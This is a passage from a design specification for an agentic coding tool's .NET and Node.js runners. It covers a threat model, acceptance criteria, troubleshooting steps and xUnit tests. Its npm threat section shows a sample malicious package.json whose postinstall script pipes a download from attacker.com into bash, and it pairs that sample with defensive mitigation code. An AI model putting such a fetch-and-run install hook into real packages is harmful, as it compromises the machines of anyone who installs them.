    {
        var sanitizedOutput = Sanitize(result.RawOutput);
        sanitizedOutput = SanitizeFilePaths(sanitizedOutput, projectRoot);

        return result with
        {
            RawOutput = sanitizedOutput
        };
    }
}
```

---

### Threat 5: Execution of Untrusted Pre/Post Install Scripts (Node.js)

**Risk Description:** npm packages can define `preinstall`, `postinstall`, and other lifecycle scripts that execute arbitrary shell commands when dependencies are installed. An attacker publishes a malicious package that runs a crypto miner or backdoor during `npm install`.

**Attack Scenario:**
```json
// Malicious package's package.json
{
  "name": "malicious-dep",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl http://attacker.com/backdoor.sh | bash"
  }
}
```

When a project depends on `malicious-dep` and runs `acode restore`, npm automatically executes the `postinstall` script, compromising the system.

**Mitigation (Complete C# Implementation):**

```csharp
namespace AgenticCoder.Infrastructure.Runners.Security;

/// <summary>
/// Controls and monitors npm lifecycle script execution.
/// </summary>
public sealed class NpmScriptExecutionGuard
{
    private readonly IConfiguration _config;
    private readonly ILogger<NpmScriptExecutionGuard> _logger;

    public NpmScriptExecutionGuard(
        IConfiguration config,
        ILogger<NpmScriptExecutionGuard> logger)
    {
        _config = config;
        _logger = logger;
    }

    /// <summary>
    /// Builds npm install command with script execution controls.
    /// </summary>
    public string BuildSecureInstallCommand(
        string packageManager,
        bool allowScripts,
        bool isCi)
    {
        var disableScriptsPolicy = _config
            .GetValue<bool>("Runners:Node:DisableLifecycleScripts");

        // Default to disabling scripts unless explicitly allowed
        var shouldDisableScripts = !allowScripts || disableScriptsPolicy;

        return packageManager switch
        {
            "npm" when shouldDisableScripts =>
                isCi ? "npm ci --ignore-scripts" : "npm install --ignore-scripts",
            "npm" =>
                isCi ? "npm ci" : "npm install",

            "yarn" when shouldDisableScripts =>
                "yarn install --ignore-scripts",
            "yarn" =>
                "yarn install",

            "pnpm" when shouldDisableScripts =>
                "pnpm install --ignore-scripts",
            "pnpm" =>
                "pnpm install",

            _ => throw new NotSupportedException($"Unknown package manager: {packageManager}")
        };
    }

    /// <summary>
    /// Scans package.json for suspicious lifecycle scripts.
    /// </summary>
    public ValidationResult ScanLifecycleScripts(string packageJsonPath)
    {
        var packageJson = File.ReadAllText(packageJsonPath);
        var package = JsonSerializer.Deserialize<PackageConfig>(packageJson);

        if (package?.Scripts == null)
        {
            return ValidationResult.Success();
        }

        var lifecycleScripts = new[]
        {
            "preinstall", "install", "postinstall",
            "preuninstall", "uninstall", "postuninstall"
        };

        var warnings = new List<string>();

        foreach (var scriptName in lifecycleScripts)
        {
            if (package.Scripts.TryGetValue(scriptName, out var scriptContent))
            {
                _logger.LogWarning(
                    "Lifecycle script detected: {Script} = {Content}",
                    scriptName,
                    scriptContent);

                warnings.Add(
                    $"Script '{scriptName}' will run during install: {scriptContent}");
            }
        }

        if (warnings.Count > 0)
        {
            return ValidationResult.Warn(
                "Project contains lifecycle scripts that execute during install. " +
                $"Review these scripts for security:\n{string.Join("\n", warnings)}\n" +
                "Use --no-scripts flag to disable or configure policy in .agent/config.yml");
        }

        return ValidationResult.Success();
    }

    /// <summary>
    /// Prompts user for confirmation before running scripts from untrusted packages.
    /// </summary>
    public async Task<bool> RequestScriptExecutionApproval(
        string packageName,
        string scriptContent,
        CancellationToken ct)
    {
        _logger.LogInformation(
            "Package '{Package}' wants to run: {Script}",
            packageName,
            scriptContent);

        Console.WriteLine($"\nPackage '{packageName}' defines lifecycle script:");
        Console.WriteLine($"  {scriptContent}");
        Console.Write("\nAllow execution? (yes/no): ");

        var response = Console.ReadLine()?.Trim().ToLower();
        return response == "yes" || response == "y";
    }
}

internal sealed class PackageConfig
{
    [JsonPropertyName("scripts")]
    public Dictionary<string, string>? Scripts { get; set; }
}
```

---

## Acceptance Criteria

### Interface Definition (AC-019-01 to AC-019-10)

- [ ] AC-019-01: ILanguageRunner interface MUST be defined with all required methods
- [ ] AC-019-02: ILanguageRunner.Language property MUST return non-empty identifier
- [ ] AC-019-03: ILanguageRunner.FilePatterns MUST return valid glob patterns
- [ ] AC-019-04: ILanguageRunner.Priority MUST return integer for ordering
- [ ] AC-019-05: ILanguageRunner.IsAvailable MUST check SDK presence correctly
- [ ] AC-019-06: IRunnerRegistry interface MUST be defined
- [ ] AC-019-07: IRunnerRegistry.Register MUST add runners to registry
- [ ] AC-019-08: IRunnerRegistry.GetRunnerForPath MUST return matching runner
- [ ] AC-019-09: IRunnerRegistry.DetectAll MUST return all matching runners
- [ ] AC-019-10: Registry MUST auto-register built-in runners on startup

### .NET Runner Detection (AC-019-11 to AC-019-20)

- [ ] AC-019-11: DotNetRunner MUST detect .sln files
- [ ] AC-019-12: DotNetRunner MUST detect .csproj files
- [ ] AC-019-13: DotNetRunner MUST detect .fsproj files
- [ ] AC-019-14: DotNetRunner MUST prefer solution over project files
- [ ] AC-019-15: DotNetRunner MUST report available when dotnet CLI exists
- [ ] AC-019-16: DotNetRunner MUST return SDK version correctly
- [ ] AC-019-17: DotNetRunner MUST read global.json requirements
- [ ] AC-019-18: Detection MUST handle nested project structures
- [ ] AC-019-19: Detection MUST handle multiple solutions
- [ ] AC-019-20: Detection MUST complete under 100ms

### .NET Runner Operations (AC-019-21 to AC-019-35)

- [ ] AC-019-21: Build MUST execute `dotnet build` with correct arguments
- [ ] AC-019-22: Build MUST support Debug configuration
- [ ] AC-019-23: Build MUST support Release configuration
- [ ] AC-019-24: Build MUST support verbosity settings
- [ ] AC-019-25: Build MUST parse MSBuild errors correctly
- [ ] AC-019-26: Build MUST parse MSBuild warnings correctly
- [ ] AC-019-27: Test MUST execute `dotnet test` with correct arguments
- [ ] AC-019-28: Test MUST support test filter expressions
- [ ] AC-019-29: Test MUST capture test results with pass/fail counts
- [ ] AC-019-30: Test MUST capture individual test names and statuses
- [ ] AC-019-31: Test MUST capture failure messages and stack traces
- [ ] AC-019-32: Run MUST execute `dotnet run` correctly
- [ ] AC-019-33: Run MUST pass arguments to the application
- [ ] AC-019-34: Restore MUST execute `dotnet restore`
- [ ] AC-019-35: Restore MUST report package restore summary

### Node.js Runner Detection (AC-019-36 to AC-019-45)

- [ ] AC-019-36: NodeRunner MUST detect package.json files
- [ ] AC-019-37: NodeRunner MUST detect npm (package-lock.json)
- [ ] AC-019-38: NodeRunner MUST detect yarn (yarn.lock)
- [ ] AC-019-39: NodeRunner MUST detect pnpm (pnpm-lock.yaml)
- [ ] AC-019-40: NodeRunner MUST report available when node exists
- [ ] AC-019-41: NodeRunner MUST return Node.js version correctly
- [ ] AC-019-42: NodeRunner MUST read .nvmrc requirements
- [ ] AC-019-43: Detection MUST handle workspace monorepos
- [ ] AC-019-44: Detection MUST handle TypeScript projects
- [ ] AC-019-45: Detection MUST complete under 100ms

### Node.js Runner Operations (AC-019-46 to AC-019-60)

- [ ] AC-019-46: Build MUST execute `npm run build` with correct package manager
- [ ] AC-019-47: Build MUST check if build script exists before execution
- [ ] AC-019-48: Build MUST support custom build script names
- [ ] AC-019-49: Build MUST parse npm/yarn error output
- [ ] AC-019-50: Test MUST execute `npm test` with correct package manager
- [ ] AC-019-51: Test MUST check if test script exists before execution
- [ ] AC-019-52: Test MUST parse Jest test output
- [ ] AC-019-53: Test MUST parse Mocha test output
- [ ] AC-019-54: Test MUST capture test results with pass/fail counts
- [ ] AC-019-55: Test MUST capture individual test names
- [ ] AC-019-56: Run MUST execute `npm start` or configured script
- [ ] AC-019-57: Run MUST support `npm run dev` for development
- [ ] AC-019-58: Restore MUST execute `npm install` or equivalent
- [ ] AC-019-59: Restore MUST support --production flag
- [ ] AC-019-60: Restore MUST handle dependency conflicts gracefully

### Output Parsing (AC-019-61 to AC-019-70)

- [ ] AC-019-61: MSBuild error parsing MUST extract file path
- [ ] AC-019-62: MSBuild error parsing MUST extract line number
- [ ] AC-019-63: MSBuild error parsing MUST extract column number
- [ ] AC-019-64: MSBuild error parsing MUST extract error code
- [ ] AC-019-65: MSBuild error parsing MUST extract message
- [ ] AC-019-66: npm error parsing MUST handle ERESOLVE
- [ ] AC-019-67: npm error parsing MUST handle ENOENT
- [ ] AC-019-68: Test output parsing MUST be framework-agnostic
- [ ] AC-019-69: Parsing failures MUST fallback to raw output
- [ ] AC-019-70: Parsing MUST handle malformed output gracefully

### CLI Integration (AC-019-71 to AC-019-80)

- [ ] AC-019-71: `acode project detect` MUST show detected projects
- [ ] AC-019-72: `acode build` MUST build using detected runner
- [ ] AC-019-73: `acode build` MUST support --configuration flag
- [ ] AC-019-74: `acode test` MUST run tests using detected runner
- [ ] AC-019-75: `acode test` MUST support --filter flag
- [ ] AC-019-76: `acode run` MUST run application using detected runner
- [ ] AC-019-77: `acode restore` MUST restore dependencies
- [ ] AC-019-78: CLI MUST prompt for runner selection when multiple match
- [ ] AC-019-79: CLI MUST display structured error output
- [ ] AC-019-80: CLI MUST display test result summary

---

## Best Practices

### Runner Design

1. **Consistent interface** - All runners implement same ILanguageRunner interface
2. **Detect automatically** - Auto-detect project type from file patterns
3. **Allow override** - User can force specific runner via config
4. **Fail gracefully** - Clear error when no runner matches

### Language-Specific

5. **.NET: Use SDK commands** - Prefer `dotnet` CLI over MSBuild directly
6. **.NET: Handle multi-targeting** - Support projects targeting multiple frameworks
7. **Node: Detect package manager** - npm, yarn, pnpm based on lock files
8. **Node: Handle ESM/CJS** - Support both module systems

### Execution

9. **Stream output** - Show build/test output in real-time
10. **Parse results** - Extract structured results from test output
11. **Handle partial failures** - Some tests passing, some failing
12. **Timeout appropriately** - Build timeouts differ from test timeouts

---

## Troubleshooting

### Issue 1: "No Runner Found for Project" Error

**Symptoms:**
- CLI command `acode build` reports "No language runner found for path /path/to/project"
- Detection returns null when expected to find .NET or Node.js project
- Projects exist but are not being recognized

**Causes:**
- Project files (.sln, .csproj, package.json) are not in expected locations
- File patterns configured in runner don't match actual file extensions
- Project files have non-standard names (e.g., `My.Project.csproj.bak`)
- Runner registry initialization failed, no runners registered

**Solutions:**

**Solution 1: Verify project file exists**
```bash
# Check for .NET projects
ls -la *.sln *.csproj *.fsproj

# Check for Node.js projects
ls -la package.json
```

**Solution 2: Run detection in verbose mode**
```bash
acode project detect --verbose
# Output will show which file patterns were checked and why they didn't match
```

**Solution 3: Manually specify runner**
```bash
# Force .NET runner
acode build --runner dotnet

# Force Node.js runner
acode build --runner node
```

**Solution 4: Check runner registry initialization**
```csharp
// Verify runners are registered at startup
var runners = await _runnerRegistry.GetAllRunnersAsync(ct);
_logger.LogInformation("Registered runners: {Runners}",
    string.Join(", ", runners.Select(r => r.Language)));
```

---

### Issue 2: SDK Not Found - Build Commands Fail

**Symptoms:**
- Error: `The command 'dotnet' was not found`
- Error: `'node' is not recognized as an internal or external command`
- `acode build` reports SDK unavailable despite SDK being installed
- Version mismatch errors (e.g., "global.json requires 8.0.100, you have 7.0.x")

**Causes:**
- .NET SDK or Node.js not installed on system
- SDK installed but not in PATH environment variable
- Wrong SDK version (global.json or .nvmrc specifies unsupported version)
- SDK path changed after runner initialization
- Permission issues preventing SDK execution

**Solutions:**

**Solution 1: Verify SDK installation**
```bash
# Check .NET SDK
dotnet --version
dotnet --list-sdks

# Check Node.js
node --version
npm --version
```

**Solution 2: Add SDK to PATH (Linux/Mac)**
```bash
# Add to ~/.bashrc or ~/.zshrc
export PATH="$PATH:/usr/share/dotnet"
export PATH="$PATH:/usr/local/bin/node"

# Reload shell
source ~/.bashrc
```

**Solution 3: Add SDK to PATH (Windows)**
```powershell
# Add to system PATH
[Environment]::SetEnvironmentVariable(
    "Path",
    "$env:Path;C:\Program Files\dotnet",
    [System.EnvironmentVariableTarget]::Machine)
```

**Solution 4: Install required SDK version**
```bash
# .NET - check global.json requirement
cat global.json
# Install from https://dotnet.microsoft.com/download

# Node.js - check .nvmrc requirement
cat .nvmrc
# Use nvm to install: nvm install $(cat .nvmrc)
```

**Solution 5: Configure explicit SDK paths in .agent/config.yml**
```yaml
runners:
  dotnet:
    sdk_path: /usr/share/dotnet/dotnet
  node:
    sdk_path: /usr/local/bin/node
    npm_path: /usr/local/bin/npm
```

---

### Issue 3: Build Output Not Being Parsed - Raw Text Displayed

**Symptoms:**
- Build errors shown as plain text wall, not structured format
- No clickable file:line:column links in output
- Test results show raw output instead of pass/fail summary
- Error: "Failed to parse build output, displaying raw result"

**Causes:**
- Build tool output format changed in newer SDK version
- Unexpected error format (e.g., third-party MSBuild task with custom errors)
- Output encoding issues (non-UTF8 characters breaking regex)
- Parser regex doesn't handle multi-line errors
- Localized SDK outputting errors in non-English language

**Solutions:**

**Solution 1: Check SDK version compatibility**
```bash
# Verify SDK version matches tested versions
dotnet --version  # Should be 6.0+, 7.0, or 8.0
node --version    # Should be 16.x+, 18.x, or 20.x
```

**Solution 2: Force English output (for parsing consistency)**
```bash
# .NET
export DOTNET_CLI_UI_LANGUAGE=en-US
dotnet build

# npm
export LANG=en_US.UTF-8
npm run build
```

**Solution 3: Use structured output formats**
```bash
# .NET - use binary log for parsing
dotnet build -bl:build.binlog
dotnet test --logger trx

# Node.js - use JSON test reporters
npm test -- --json --outputFile=test-results.json
```

**Solution 4: View raw output for debugging**
```bash
# Show raw output without parsing
acode build --no-parse --verbose
```

**Solution 5: Report parser issue**
```bash
# Capture output that failed to parse
acode build --verbose 2>&1 | tee build-output.log
# Submit build-output.log to maintainers for parser improvement
```

---

### Issue 4: Dependency Restore Fails with Network Errors

**Symptoms:**
- Error: `Failed to download package X from nuget.org`
- Error: `ETIMEDOUT` or `ECONNREFUSED` during npm install
- Restore operation hangs indefinitely
- Error: `Unable to load the service index for source https://api.nuget.org/v3/index.json`
- Works on some machines, fails on others (network policy differences)

**Causes:**
- No internet connection or firewall blocking package registries
- Corporate proxy requires authentication
- Package registry (nuget.org, npmjs.com) temporarily unavailable
- Registry URL misconfigured (HTTP instead of HTTPS, or wrong domain)
- Package removed from registry (unpublished package)
- SSL certificate validation failing

**Solutions:**

**Solution 1: Verify network connectivity**
```bash
# Test NuGet registry
curl -I https://api.nuget.org/v3/index.json

# Test npm registry
curl -I https://registry.npmjs.org
```

**Solution 2: Configure proxy settings (.NET)**
```bash
# Set proxy environment variables
export HTTP_PROXY=http://proxy.company.com:8080
export HTTPS_PROXY=http://proxy.company.com:8080
export NO_PROXY=localhost,127.0.0.1

dotnet restore
```

**Solution 3: Configure proxy settings (npm)**
```bash
# Set npm proxy configuration
npm config set proxy http://proxy.company.com:8080
npm config set https-proxy http://proxy.company.com:8080

npm install
```

**Solution 4: Use offline/cached mode**
```bash
# .NET - use local cache only
dotnet restore --source ~/.nuget/packages

# npm - use offline mode
npm install --prefer-offline
```

**Solution 5: Configure custom package sources**
```yaml
# .agent/config.yml
runners:
  dotnet:
    package_sources:
      - https://internal-nuget.company.com/v3/index.json
      - https://api.nuget.org/v3/index.json
  node:
    registry: https://internal-npm.company.com
```

**Solution 6: Clear package caches**
```bash
# .NET - clear NuGet cache
dotnet nuget locals all --clear

# npm - clear cache
npm cache clean --force
```

---

### Issue 5: Tests Pass Locally But Fail in Acode

**Symptoms:**
- Tests pass when running `dotnet test` manually
- Tests pass when running `npm test` manually
- Same tests fail when running `acode test`
- Different test results between manual run and runner
- Flaky tests that sometimes pass, sometimes fail

**Causes:**
- Environment variables differ between manual and runner execution
- Working directory differs (tests expect to run from specific path)
- Test runner passes different arguments (e.g., `--parallel` flag)
- Tests depend on global state or external services not available
- Timeout too short for slow tests
- Tests assume interactive terminal (ANSI color codes, prompts)

**Solutions:**

**Solution 1: Check working directory**
```bash
# Verify runner uses correct working directory
acode test --verbose
# Look for "Working directory: /path/to/project"

# Manually run from same directory
cd /path/to/project
dotnet test
```

**Solution 2: Compare environment variables**
```bash
# Capture env vars from manual run
dotnet test > /dev/null && env | sort > manual-env.txt

# Capture env vars from runner
acode test > /dev/null && env | sort > runner-env.txt

# Compare differences
diff manual-env.txt runner-env.txt
```

**Solution 3: Increase timeout for slow tests**
```yaml
# .agent/config.yml
runners:
  dotnet:
    test_timeout_seconds: 600  # 10 minutes instead of default 5
  node:
    test_timeout_seconds: 300
```

**Solution 4: Disable test parallelization**
```bash
# .NET - run tests sequentially
acode test -- --parallel none

# Jest - disable parallel
acode test -- --runInBand
```

**Solution 5: Pass missing environment variables**
```bash
# Set environment for test run
export DATABASE_URL=sqlite::memory:
export API_KEY=test-key
acode test
```

**Solution 6: Check test output format**
```csharp
// Ensure tests don't assume terminal capabilities
// BAD: Tests that require interactive input
Console.ReadLine();  // Hangs in non-interactive mode

// GOOD: Tests that work in any environment
var input = Environment.GetEnvironmentVariable("TEST_INPUT") ?? "default";
```

---

## Testing Requirements

### Unit Tests

Complete C# unit test implementations using xUnit, FluentAssertions, and NSubstitute.

#### Runner Registry Tests

```csharp
using Xunit;
using FluentAssertions;
using NSubstitute;
using AgenticCoder.Domain.Runners;
using AgenticCoder.Infrastructure.Runners;
using Microsoft.Extensions.Logging.Nulls;

namespace AgenticCoder.Infrastructure.Tests.Runners;

public sealed class RunnerRegistryTests
{
    private readonly IRunnerRegistry _sut;
    private readonly ILanguageRunner _dotNetRunner;
    private readonly ILanguageRunner _nodeRunner;

    public RunnerRegistryTests()
    {
        _dotNetRunner = Substitute.For<ILanguageRunner>();
        _dotNetRunner.Language.Returns("dotnet");
        _dotNetRunner.Priority.Returns(100);
        _dotNetRunner.FilePatterns.Returns(new[] { "*.sln", "*.csproj" });

        _nodeRunner = Substitute.For<ILanguageRunner>();
        _nodeRunner.Language.Returns("node");
        _nodeRunner.Priority.Returns(90);
        _nodeRunner.FilePatterns.Returns(new[] { "package.json" });

        _sut = new RunnerRegistry(NullLogger<RunnerRegistry>.Instance);
    }

    [Fact]
    public async Task RunnerRegistry_Register_AddsRunner()
    {
        // Arrange
        var runner = _dotNetRunner;

        // Act
        _sut.Register(runner);
        var result = await _sut.GetRunnerAsync("dotnet", CancellationToken.None);

        // Assert
        result.Should().BeSameAs(runner);
    }

    [Fact]
    public void RunnerRegistry_Register_DuplicateLanguage_Throws()
    {
        // Arrange
        var runner1 = _dotNetRunner;
        var runner2 = Substitute.For<ILanguageRunner>();
        runner2.Language.Returns("dotnet");

        _sut.Register(runner1);

        // Act
        Action act = () => _sut.Register(runner2);

        // Assert
        act.Should().Throw<ArgumentException>()
            .WithMessage("*already registered*");
    }

    [Fact]
    public async Task RunnerRegistry_GetRunner_ReturnsCorrectRunner()
    {
        // Arrange
        _sut.Register(_dotNetRunner);
        _sut.Register(_nodeRunner);

        // Act
        var result = await _sut.GetRunnerAsync("node", CancellationToken.None);

        // Assert
        result.Should().BeSameAs(_nodeRunner);
        result.Language.Should().Be("node");
    }

    [Fact]
    public async Task RunnerRegistry_GetRunner_UnknownLanguage_ReturnsNull()
    {
        // Arrange
        _sut.Register(_dotNetRunner);

        // Act
        var result = await _sut.GetRunnerAsync("python", CancellationToken.None);

        // Assert
        result.Should().BeNull();
    }

    [Fact]
    public async Task RunnerRegistry_GetRunnerForPath_MatchesPatterns()
    {
        // Arrange
        _sut.Register(_dotNetRunner);
        _sut.Register(_nodeRunner);

        var projectPath = "/repo/MyApp.sln";
        _dotNetRunner.DetectAsync(projectPath, Arg.Any<CancellationToken>())
            .Returns(new DetectionResult { IsMatch = true, ProjectFile = projectPath });

        // Act
        var result = await _sut.GetRunnerForPathAsync(projectPath, CancellationToken.None);

        // Assert
        result.Should().BeSameAs(_dotNetRunner);
    }

    [Fact]
    public async Task RunnerRegistry_GetRunnerForPath_NoMatch_ReturnsNull()
    {
        // Arrange
        _sut.Register(_dotNetRunner);

        var projectPath = "/repo/Makefile";
        _dotNetRunner.DetectAsync(projectPath, Arg.Any<CancellationToken>())
            .Returns(new DetectionResult { IsMatch = false });

        // Act
        var result = await _sut.GetRunnerForPathAsync(projectPath, CancellationToken.None);

        // Assert
        result.Should().BeNull();
    }

    [Fact]
    public async Task RunnerRegistry_GetRunnerForPath_MultipleMatch_ReturnsHighestPriority()
    {
        // Arrange
        _sut.Register(_dotNetRunner);  // Priority 100
        _sut.Register(_nodeRunner);    // Priority 90

        var projectPath = "/repo";
        _dotNetRunner.DetectAsync(projectPath, Arg.Any<CancellationToken>())
            .Returns(new DetectionResult { IsMatch = true, ProjectFile = "/repo/App.sln" });
        _nodeRunner.DetectAsync(projectPath, Arg.Any<CancellationToken>())
            .Returns(new DetectionResult { IsMatch = true, ProjectFile = "/repo/package.json" });

        // Act
        var result = await _sut.GetRunnerForPathAsync(projectPath, CancellationToken.None);

        // Assert
        result.Should().BeSameAs(_dotNetRunner);
        result.Priority.Should().Be(100);
    }

    [Fact]
    public async Task RunnerRegistry_GetAllRunners_ReturnsAll()
    {
        // Arrange
        _sut.Register(_dotNetRunner);
        _sut.Register(_nodeRunner);

        // Act
        var result = await _sut.GetAllRunnersAsync(CancellationToken.None);

        // Assert
        result.Should().HaveCount(2);
        result.Should().Contain(_dotNetRunner);
        result.Should().Contain(_nodeRunner);
    }

    [Fact]
    public async Task RunnerRegistry_DetectAll_ReturnsAllMatches()
    {
        // Arrange
        _sut.Register(_dotNetRunner);
        _sut.Register(_nodeRunner);

        var projectPath = "/repo";
        _dotNetRunner.DetectAsync(projectPath, Arg.Any<CancellationToken>())
            .Returns(new DetectionResult { IsMatch = true, ProjectFile = "/repo/App.sln" });
        _nodeRunner.DetectAsync(projectPath, Arg.Any<CancellationToken>())
            .Returns(new DetectionResult { IsMatch = true, ProjectFile = "/repo/package.json" });

        // Act
        var result = await _sut.DetectAllAsync(projectPath, CancellationToken.None);

        // Assert
        result.Should().HaveCount(2);
        result.Select(r => r.Language).Should().Contain(new[] { "dotnet", "node" });
    }
}
```

#### .NET Runner Tests

```csharp
using Xunit;
using FluentAssertions;
using NSubstitute;
using AgenticCoder.Domain.Runners;
using AgenticCoder.Infrastructure.Runners;
using AgenticCoder.Infrastructure.Command;
using Microsoft.Extensions.Logging.Nulls;

namespace AgenticCoder.Infrastructure.Tests.Runners;

public sealed class DotNetRunnerTests
{
    private readonly ICommandExecutor _commandExecutor;
    private readonly DotNetRunner _sut;

    public DotNetRunnerTests()
    {
        _commandExecutor = Substitute.For<ICommandExecutor>();
        _sut = new DotNetRunner(
            _commandExecutor,
            NullLogger<DotNetRunner>.Instance);
    }

    [Fact]
    public void DotNetRunner_Language_ReturnsDotNet()
    {
        // Act
        var result = _sut.Language;

        // Assert
        result.Should().Be("dotnet");
    }

    [Fact]
    public void DotNetRunner_FilePatterns_IncludesSlnAndProjects()
    {
        // Act
        var result = _sut.FilePatterns;

        // Assert
        result.Should().Contain("*.sln");
        result.Should().Contain("*.csproj");
        result.Should().Contain("*.fsproj");
    }

    [Fact]
    public async Task DotNetRunner_IsAvailable_TrueWhenDotNetExists()
    {
        // Arrange
        _commandExecutor.ExecuteAsync(
            "dotnet",
            new[] { "--version" },
            Arg.Any<string>(),
            Arg.Any<CancellationToken>())
            .Returns(new CommandResult
            {
                ExitCode = 0,
                Output = "8.0.100"
            });

        // Act
        var result = await _sut.IsAvailableAsync(CancellationToken.None);

        // Assert
        result.Should().BeTrue();
    }

    [Fact]
    public async Task DotNetRunner_IsAvailable_FalseWhenDotNetMissing()
    {
        // Arrange
        _commandExecutor.ExecuteAsync(
            "dotnet",
            new[] { "--version" },
            Arg.Any<string>(),
            Arg.Any<CancellationToken>())
            .Returns(Task.FromException<CommandResult>(
                new FileNotFoundException("dotnet not found")));

        // Act
        var result = await _sut.IsAvailableAsync(CancellationToken.None);

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public async Task DotNetRunner_BuildAsync_ConstructsCorrectCommand()
    {
        // Arrange
        var projectPath = "/repo/MyApp.sln";
        var options = new BuildOptions
        {
            Configuration = "Release",
            Verbosity = "minimal"
        };

        _commandExecutor.ExecuteAsync(
            "dotnet",
            Arg.Any<string[]>(),
            Arg.Any<string>(),
            Arg.Any<CancellationToken>())
            .Returns(new CommandResult { ExitCode = 0, Output = "Build succeeded." });

        // Act
        await _sut.BuildAsync(projectPath, options, CancellationToken.None);

        // Assert
        await _commandExecutor.Received(1).ExecuteAsync(
            "dotnet",
            Arg.Is<string[]>(args =>
                args.Contains("build") &&
                args.Contains(projectPath) &&
                args.Contains("--configuration") &&
                args.Contains("Release") &&
                args.Contains("--verbosity") &&
                args.Contains("minimal")),
            Arg.Any<string>(),
            Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task DotNetRunner_TestAsync_ConstructsCorrectCommand()
    {
        // Arrange
        var projectPath = "/repo/tests/MyApp.Tests.csproj";
        var options = new TestOptions
        {
            Filter = "Category=Unit",
            NoBuild = true
        };

        _commandExecutor.ExecuteAsync(
            "dotnet",
            Arg.Any<string[]>(),
            Arg.Any<string>(),
            Arg.Any<CancellationToken>())
            .Returns(new CommandResult { ExitCode = 0, Output = "Test run: 10 passed, 0 failed" });

        // Act
        await _sut.TestAsync(projectPath, options, CancellationToken.None);

        // Assert
        await _commandExecutor.Received(1).ExecuteAsync(
            "dotnet",
            Arg.Is<string[]>(args =>
                args.Contains("test") &&
                args.Contains(projectPath) &&
                args.Contains("--filter") &&
                args.Contains("Category=Unit") &&
                args.Contains("--no-build")),
            Arg.Any<string>(),
            Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task DotNetRunner_BuildAsync_ParsesErrors()
    {
        // Arrange
        var projectPath = "/repo/MyApp.csproj";
        var buildOutput = @"
Program.cs(42,15): error CS1002: ; expected [/repo/MyApp.csproj]
Program.cs(43,10): warning CS0168: Variable is declared but never used [/repo/MyApp.csproj]
Build FAILED.
";

        _commandExecutor.ExecuteAsync(
            "dotnet",
            Arg.Any<string[]>(),
            Arg.Any<string>(),
            Arg.Any<CancellationToken>())
            .Returns(new CommandResult { ExitCode = 1, Output = buildOutput });

        // Act
        var result = await _sut.BuildAsync(projectPath, new BuildOptions(), CancellationToken.None);

        // Assert
        result.Success.Should().BeFalse();
        result.Errors.Should().HaveCount(1);
        result.Errors[0].File.Should().Be("Program.cs");
        result.Errors[0].Line.Should().Be(42);
        result.Errors[0].Column.Should().Be(15);
        result.Errors[0].Code.Should().Be("CS1002");
        result.Errors[0].Message.Should().Be("; expected");

        result.Warnings.Should().HaveCount(1);
        result.Warnings[0].Code.Should().Be("CS0168");
    }
}
```

### Integration Tests

Integration tests verify runners work with real SDK installations and project files.

**Test Structure:**
- Use temporary directories for test projects
- Invoke actual `dotnet` and `npm` commands
- Verify real output parsing
- Clean up test artifacts

**Key Integration Tests:**
- `DotNetRunner_Build_RealProject_Succeeds` - Creates minimal .csproj, builds it, verifies success
- `NodeRunner_Test_RealProject_CapturesResults` - Creates package.json with Jest tests, runs them, verifies parsed results
- `RunnerRegistry_DetectAll_MixedProject_ReturnsB Both` - Creates repo with both .sln and package.json, verifies both runners detected

### Performance Benchmarks

Use BenchmarkDotNet to measure runner performance:

| Operation | Target | Maximum | Test Method |
|-----------|--------|---------|-------------|
| Detection (.NET) | <50ms | 100ms | `Benchmark_Detect_DotNet_1000Projects` |
| Detection (Node) | <50ms | 100ms | `Benchmark_Detect_Node_1000Projects` |
| Command Construction | <5ms | 10ms | `Benchmark_BuildCommand_DotNet` |
| MSBuild Parsing | <25ms | 50ms | `Benchmark_ParseMSBuild_100Errors` |
| Jest Parsing | <100ms | 500ms | `Benchmark_ParseJest_1000Tests` |
| Registry Lookup | <1ms | 5ms | `Benchmark_RegistryLookup_10Runners` |

- `RunnerResult_Success_TrueWhenNoErrors`
- `RunnerResult_Success_FalseWhenErrors`
- `RunnerResult_Errors_ContainsAllErrors`
- `RunnerResult_Warnings_ContainsAllWarnings`
- `RunnerResult_TestResults_ContainsCounts`
- `RunnerResult_Serialization_RoundTrips`

### Integration Tests

#### .NET Runner Integration Tests (`Tests/Integration/Runners/DotNetRunnerIntegrationTests.cs`)

- `DotNetRunner_Build_RealProject_Succeeds`
- `DotNetRunner_Build_InvalidProject_ReturnsErrors`
- `DotNetRunner_Test_RealProject_CapturesResults`
- `DotNetRunner_Test_FailingTests_ReportsFailures`
- `DotNetRunner_Restore_RealProject_Downloads`
- `DotNetRunner_MultipleSolutions_DetectsAll`

#### Node.js Runner Integration Tests (`Tests/Integration/Runners/NodeRunnerIntegrationTests.cs`)

- `NodeRunner_Build_RealProject_Succeeds`
- `NodeRunner_Build_NoScript_ReportsError`
- `NodeRunner_Test_RealProject_CapturesResults`
- `NodeRunner_Test_FailingTests_ReportsFailures`
- `NodeRunner_Restore_RealProject_InstallsDependencies`
- `NodeRunner_Workspace_DetectsAll`

#### CLI Integration Tests (`Tests/Integration/CLI/RunnerCommandTests.cs`)

- `DetectCommand_MultipleProjects_ListsAll`
- `BuildCommand_SelectsCorrectRunner`
- `TestCommand_DisplaysResults`
- `RunCommand_StartsApplication`
- `RestoreCommand_InstallsDependencies`

### End-to-End Tests

#### Runner E2E Tests (`Tests/E2E/Runners/RunnerE2ETests.cs`)

- `E2E_DotNet_FullCycle_DetectBuildTestRun`
- `E2E_Node_FullCycle_DetectBuildTestRun`
- `E2E_MixedProject_DetectsBoth`
- `E2E_CLI_BuildCommand_WorksEndToEnd`
- `E2E_CLI_TestCommand_ShowsResults`
- `E2E_MissingSdk_ReportsError`

### Performance Benchmarks

| Benchmark | Method | Target | Maximum |
|-----------|--------|--------|---------|
| Detection | `Benchmark_Detect_DotNet` | 50ms | 100ms |
| Detection | `Benchmark_Detect_Node` | 50ms | 100ms |
| Command Construction | `Benchmark_BuildCommand` | 5ms | 10ms |
| MSBuild Parsing | `Benchmark_ParseMSBuild_100Errors` | 25ms | 50ms |
| Jest Parsing | `Benchmark_ParseJest_1000Tests` | 100ms | 500ms |
| Registry Lookup | `Benchmark_RegistryLookup` | 1ms | 5ms |

### Test Coverage Requirements

| Component | Minimum Coverage |
|-----------|------------------|
| ILanguageRunner.cs | 100% |
| RunnerRegistry.cs | 90% |
| DotNetRunner.cs | 85% |
